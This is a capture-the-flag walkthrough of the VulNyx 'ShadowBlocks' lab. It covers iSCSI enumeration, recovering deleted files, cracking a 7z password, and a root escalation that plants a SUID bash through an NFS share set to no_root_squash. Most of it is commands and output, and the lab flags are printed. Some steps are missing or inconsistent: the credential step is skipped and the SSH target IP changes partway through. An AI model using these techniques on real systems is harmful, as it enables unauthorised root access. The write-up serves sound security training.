## Overview

---

<img width="842" height="438" alt="shadowblocks-vulnyx" src="/images/writeups/vulnyx/shadowblocks.png" />

ShadowBlocks is an easy VulNyx machine that focuses on storage enumeration, forensic recovery, password cracking, credential disclosure, and privilege escalation through an insecure NFS configuration. The machine demonstrates how exposed storage services and infrastructure misconfigurations can lead to full system compromise. 

---

### Key Vulnerabilities

  - Exposed iSCSI Storage
  - Deleted File Recovery
  - Weak 7-Zip Password
  - Credential Disclosure
  - Misconfigured NFS Export (`no_root_squash`)
  - Privilege Escalation via SUID Bash

---

## 🔍 Network Discovery

First, scan the local network to identify active hosts using `arp-scan`.

```bash
sudo arp-scan --localnet 
```

### Result

```bash
$ sudo arp-scan  --localnet                   
[sudo] password for arc: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:8d:a8:e2, IPv4: 192.168.102.76
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.102.109 fe:f7:e9:58:e3:54       (Unknown: locally administered)
192.168.102.142 00:0c:29:8f:76:54       VMware, Inc.

2 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.028 seconds (126.23 hosts/sec). 2 responded
```

The target machine IP address was identified as:

```text
192.168.102.142
```

---

## 🔎 Reconnaissance

First, perform a full TCP port scan against the target using Nmap.

```bash
nmap -n -Pn -sS -p- --min-rate 5000 192.168.102.142
```

#### Scan Results

```bash
$ nmap -n -Pn -sS -p- --min-rate 5000 192.168.102.142
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-07 08:27 -0700
Nmap scan report for 192.168.102.142
Host is up (0.00076s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
3260/tcp open  iscsi
MAC Address: 00:0C:29:8F:76:54 (VMware)

```

#### Findings

- Port **22** → SSH
- Port **3260** → iSCSI

The iSCSI service appeared particularly interesting and became the primary attack vector.

---

## 💽 iSCSI Enumeration

Use `iscsiadm` in discovery mode to identify available iSCSI targets.

```bash
sudo iscsiadm -m discovery -t sendtargets -p 192.168.102.142
```

### Result

```bash
$ sudo iscsiadm -m discovery -t sendtargets -p 192.168.102.142                                 
192.168.102.142:3260,1 iqn.2026-02.nyx.shadowblocks:storage.disk1
```

A single storage target was discovered.

---

## 🔗 Connecting to the iSCSI Target

Login to the discovered target.

```bash
sudo iscsiadm -m node -T iqn.2026-02.nyx.shadowblocks:storage.disk1 -p 192.168.102.142 --login
```

### Result

```bash
$ sudo iscsiadm -m node -T iqn.2026-02.nyx.shadowblocks:storage.disk1 -p 192.168.102.142 --login
Login to [iface: default, target: iqn.2026-02.nyx.shadowblocks:storage.disk1, portal: 192.168.102.142,3260] successful.
```

---

## 🔍 Verifying the Connected Disk

Check the available block devices.

```bash
lsblk
```

### Result

```text
$ lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS
sda      8:0    0   60G  0 disk 
└── sda1   8:1    0 56.9G  0 part /
└── sda2   8:2    0    1K  0 part 
└── sda5   8:5    0  3.1G  0 part [SWAP]
sdb      8:16   0  150M  1 disk 
└── sdb1   8:17   0  149M  1 part 
sr0     11:0    1 1024M  0 rom  

```

A new disk (`sdb1`) was attached.

---

## 📂 Mounting the Disk

Create a mount point.

```bash
sudo mkdir /mnt/shadowblocks
```

Mount the partition.

```bash
sudo mount /dev/sdb1 /mnt/shadowblocks
```

### Result

```text
$ sudo mount /dev/sdb1 /mnt/shadowblocks 
mount: /mnt/shadowblocks: WARNING: source write-protected, mounted read-only.
```

---

## 📁 Exploring the Filesystem

List the contents of the mounted filesystem.

```bash
tree *
```

### Result

```bash
$ tree *
backups
└── backup_february_2026.bak
└── backup_january_2026.bak
configs
└── storage.conf
docs
└── company_overview.txt

└── employees.txt
logs
└── system.log
lost+found  [error opening dir]
random_fill.bin  [error opening dir]
```

Among these directories, the `logs` directory appeared interesting.

---

## 📄 Reviewing System Logs

Read the system log.

```bash
cat logs/system.log
```

### Result

```text
[2026-01-04 09:14:22] INFO  System boot completed.
[2026-01-04 09:15:01] INFO  iSCSI service started.
[2026-01-04 09:16:33] WARN  Authentication disabled for testing purposes.
[2026-01-10 22:41:17] INFO  Backup job executed successfully.
[2026-01-12 02:12:44] ERROR Temporary storage latency detected.
[2026-01-12 02:13:02] INFO  Latency normalized.
[2026-01-20 18:55:10] INFO  Log rotation completed.
```

#### Important Observation

The log mentioned:

- Backup activity
- Temporary storage issues

This suggested that deleted files might still be recoverable.

---

## 🛠 Recovering Deleted Files

Create a temporary directory to store recovered files.

```bash
sudo mkdir /tmp/shadowblocks
```

Recover deleted files using **PhotoRec**.

```bash
sudo photorec /dev/sdb1
```
- Select the Disk
<img width="1032" height="310" alt="photo-rec-1" src="https://github.com/user-attachments/assets/1049bf43-4728-4043-a13f-b713beb78f33" />

- Select the Whole Disk
  
<img width="1027" height="305" alt="photo-rec-2" src="https://github.com/user-attachments/assets/b978f5b7-4b14-4664-9bb3-e15bb29801f0" />

- Select the File-System

<img width="1028" height="325" alt="photo-rec-3" src="https://github.com/user-attachments/assets/26ebca06-2bf5-42f9-9c7f-4cae1d4098f3" />

- Select the Destination folder o save the Recovered files
  
<img width="1025" height="305" alt="photo-rec-4" src="https://github.com/user-attachments/assets/653e1d70-14aa-49ee-9dd9-f3d189722d05" />

- Then press `c` to start the Recovey process
  
<img width="1022" height="575" alt="photo-rec-5" src="https://github.com/user-attachments/assets/bbb05a05-2be9-466f-8619-c452384035c8" />

After the recovery completed successfully, 8 files were restored.

Navigate to the recovered directory.

```bash
cd /tmp/shadowblocks/recup_dir.1
```

### Result

```text
cd /tmp/shadowblocks/recup_dir.1
$ ls
f0018434.7z  f0018436.txt  f0018438.txt  f0018440.txt  f0018442.txt  f0018444.txt  f0018446.txt  f0018448.7z  report.xml

```

Among the recovered files, a password-protected **7z archive** was discovered.

---

## 🔓 Cracking the 7-Zip Archive

Convert the archive into a John-compatible hash.

```bash
7z2john f0018434.7z > hash
```

Crack the password using John the Ripper.

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

### Result

```text

The password = `donald`

The archive password was successfully recovered.

---

## 📂 Extracting the Archive

Extract the archive using the password we found

```bash
7z x f0018434.7z
```

Enter the password:

```text

```

Successfully gained access as user **lenam**.

---

## 🏁 User Flag

The user flag was located inside the home directory.

```bash
cat user.txt
```

### Result

```text
c94a424cb23a6b53b235511a01a9a443
```

---

## 🔍 Privilege Escalation Enumeration

Check for capabilities, Search for writable files 

```bash
getcap -r / 2>/dev/null
```

Search for writable files.

```bash
find / -type f -writable 2>/dev/null | grep -ivE "proc|sys|var|home"
```

Search for SUID binaries.

```bash
find / -type f -perm -4000 2>/dev/null
```
### Result 
```bash
lenam@shadowblocks:~$ getcap -r / 2>/dev/null
lenam@shadowblocks:~$ find / -type f -writable 2>/dev/null | grep -ivE "proc|var|sys|home"
lenam@shadowblocks:~$ find / -type f -perm /4000 2>/dev/null
/usr/sbin/mount.nfs
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/su
/usr/bin/chsh
/usr/bin/mount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/passwd
```
Nothing immediately useful was discovered.

However, the presence of `mount.nfs` suggested that NFS might be configured.

---

## 📄 Reviewing NFS Exports

Inspect the NFS exports configuration.

```bash
cat /etc/exports
```

### Result

```text
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/srv/nfs *(rw,sync,fsid=0,no_subtree_check,no_root_squash,insecure)
```

#### Important Finding

The export was configured with:

```text
no_root_squash
```

#### Why is this Dangerous?

The `no_root_squash` option allows a client connecting as **root** to retain root privileges on the exported NFS share.

This misconfiguration can be abused to create SUID binaries on the shared directory, resulting in privilege escalation.

---

## 🔗 Creating an SSH Tunnel

Forward the NFS service through SSH.

```bash
ssh -L 2049:127.0.0.1:2049 lenam@192.168.102.142
```
```
$ ssh -L 2049:127.0.0.1:2049 lenam@192.168.29.116 
lenam@192.168.29.116's password: 
Permission denied, please try again.
lenam@192.168.29.116's password: 
Linux shadowblocks 6.12.73+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.73-1 (2026-02-17) x86_64

The programs included with the Debian GNU/Linux system are free software;

permitted by applicable law.
Last login: Wed Jul  8 12:43:08 2026 from 192.168.29.56
```

We successfully established the SSH tunnel. We can verify that the tunnel has been established by using the `ss` command to check whether port **2049** is listening on the local machine.
Open another terminal on the attacker machine.

---

## 📂 Mounting the NFS Share

Create a mount point.

```bash
sudo mkdir /mnt/shadow-nfs
```

Mount the exported share.

```bash
sudo mount -t nfs 127.0.0.1:/ /mnt/shadow-nfs
```

Navigate into the mounted directory.

```bash
cd /mnt/shadow-nfs
```

---

## 🚀 Creating a SUID Bash

Copy the local Bash binary.

```bash
sudo cp /bin/bash .
```

Set the SUID bit.

```bash
sudo chmod u+s bash
```

Verify the permissions.

```bash
$ ls -la              
total 1364
drwxr-xr-x 2 root root    4096 Jul  8 04:24 .
drwxr-xr-x 4 root root    4096 Jul  8 04:19 ..
---Sr-xr-x 1 root root 1384752 Jul  8 04:24 bash
-rw-rw-r-- 1 root root       0 Feb 28 12:20 text.txt

-rwsr-xr-x 1 root root bash
```

The Bash binary now executes with root privileges.

---

## 👑 Privilege Escalation

Return to the SSH session.

Execute the SUID Bash binary.

```bash
/srv/nfs/bash -p
```

Verify privileges.

```bash
id ; whoami
```

### Result

```bash
lenam@shadowblocks:~$ /srv/nfs/bash -p
bash-5.3# id ;whoami
uid=1000(lenam) gid=1000(lenam) euid=0(root) grupos=1000(lenam),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev)
root
bash-5.3# 
```

Successfully escalated privileges to root.

---

## 🏁 Root Flag

Read the root flag.

```bash
cat /root/root.txt
```

### Result

```text
402482f61c16a59f688d36d5134f97d1
```

## 🧾 Summary

| Phase | Technique |
|------|-----------|
| Network Discovery | arp-scan |
| Enumeration | Nmap |
| Storage Enumeration | iSCSI |
| File Recovery | PhotoRec |
| Password Cracking | John the Ripper |
| Initial Access | SSH |
| Privilege Escalation | NFS `no_root_squash` |
| Root Access | SUID Bash |

---

## 🚀 Key Takeaways

- Exposed iSCSI targets may contain sensitive or deleted data.
- Deleted files can often be recovered from mounted storage devices.
- Weak archive passwords can expose administrative credentials.
- Always review NFS exports during privilege escalation.
- The `no_root_squash` option is extremely dangerous because it allows attackers to create SUID binaries and obtain root access.
